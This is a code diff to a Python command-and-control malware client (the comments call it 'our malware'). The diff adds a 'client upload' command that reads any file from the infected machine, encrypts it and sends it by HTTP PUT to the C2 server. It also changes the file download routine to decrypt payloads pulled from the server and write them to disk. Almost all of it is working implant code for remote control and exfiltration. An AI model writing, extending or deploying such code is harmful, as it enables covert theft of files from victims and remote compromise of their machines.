@@ -5,25 +5,20 @@ Author: Davood Yahay(D.Yakuza)
 # Import os methods based on OS, use platform.system() to detect OS
 from platform import system
 
-# Import for Windows Builds only
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
-# Import for Linux Builds only
 elif system() == "Linux":
     from os import getenv, uname, chdir, path, getcwd
 
 # Import for both Linux & Windows Builds
-from requests import get, exceptions, post
-# Custom Features Import
+from requests import get, exceptions, post, put
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
-from shutil import copyfileobj
-
 from encryption import cipher
 # Settings Variables(Constants) Importing
-from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
-                      C2_SERVER, DELAY, PORT, PROXY, HEADERS)
+from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND)
 
 # If Client have Windows OS
 if system() == "Windows":
@@ -135,10 +130,10 @@ while True:
             filepath = command.split()[2]
 
             # Split out the filename from the end of file path, or if only a file name was supplied, use it.
-            filename = filepath.rsplit("/",1)[-1]
+            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
 
             # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
-            encryptedFilepath = cipher.encrypt(filename.encode()).decode()
+            encryptedFilepath = cipher.encrypt(filepath.encode()).decode()
 
             # Use and HTTP GET request to stream the requested file from c2 server
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
@@ -148,8 +143,10 @@ while True:
                 if response.status_code == 200:
                     # Open the file and write the contents of the response to it
                     with open(filename, "wb") as fileHandle:
-                        """Use #noinspection PyTypeChecker to ignore warning"""
-                        copyfileobj(response.raw, fileHandle)
+                        # Decrypt the Response content and write the file out to the Disk, then Notify us on Server
+                        fileHandle.write(cipher.decrypt(response.content))
+
+                    # Notify us on the server that the file was downloaded
                     post_to_server(f"{filename} is now on {client}.\n")
 
         # If the path of the file doesn't enter correctly, notify us on the server
@@ -161,7 +158,43 @@ while True:
             post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
 
 
-    #the client Kill Command shutdown our malware
+    # The client upload FILENAME command allows us to transfer a file to the c2 server from our connected client,
+    # Actually Client can Upload a file to server
+    elif command.startswith("client upload"):
+
+        # Initialize filename to get rid of annoying Pycharm Warning
+        filename = None
+        filepath = None
+
+        try:
+            # Split out the filepath to download, after split 0-client & 1-download & 2-path, so we need index 2
+            filepath = command.split()[2]
+
+            # Split out the filename from the end of file path, or if only a file name was supplied, use it.
+            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
+
+            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
+            encryptedFilename = cipher.encrypt(filename.encode()).decode()
+
+            #Test Print
+            print(f"file name is: {filename}")
+            print(f"encrypted file name is: {encryptedFilename}")
+
+            # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
+            with open(filepath, "rb") as fileHandle:
+                encryptedFile = cipher.encrypt(fileHandle.read())
+                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
+                    headers=HEADERS, proxies=PROXY)
+
+        # If the path of the file doesn't enter correctly, notify us on the server
+        except IndexError:
+            post_to_server(f"You must enter the File Name to be downloaded on the client")
+
+        # Exception Handling Common Errors maybe occurs
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
+
+# the client Kill Command shutdown our malware
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been Killed. \n")
         exit()
